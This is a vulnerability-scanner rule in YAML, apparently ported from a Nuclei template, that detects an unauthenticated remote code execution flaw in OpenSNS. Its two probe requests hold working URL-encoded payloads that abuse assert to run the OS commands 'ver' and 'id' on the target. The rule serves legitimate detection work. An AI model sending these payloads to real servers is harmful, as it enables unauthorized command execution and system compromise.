schema_version: 1
id: "cortex.community:opensns-rce"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "OpenSNS - Remote Code Execution"
  description: "OpenSNS allows remote unauthenticated attackers to execute arbitrary code via the 'shareBox' endpoint. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  cwes: [77]
  tags: ["opensns", "rce", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "Critical"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)" }
  - id: "probe1"
    request: { method: "GET", path: "/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(id)" }
proof:
  kind: "signal.v1"
  assertions:
    any:
      - all:
          - any:
              - regex: { left: { ref: "steps.probe0.body" }, right: { value: "uid=([0-9(a-z)]+)" } }
              - regex: { left: { ref: "steps.probe0.body" }, right: { value: "Microsoft Windows" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "/Application/" } }
          - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
      - all:
          - any:
              - regex: { left: { ref: "steps.probe1.body" }, right: { value: "uid=([0-9(a-z)]+)" } }
              - regex: { left: { ref: "steps.probe1.body" }, right: { value: "Microsoft Windows" } }
          - contains: { left: { ref: "steps.probe1.body" }, right: { value: "/Application/" } }
          - eq: { left: { ref: "steps.probe1.status" }, right: { value: 200 } }
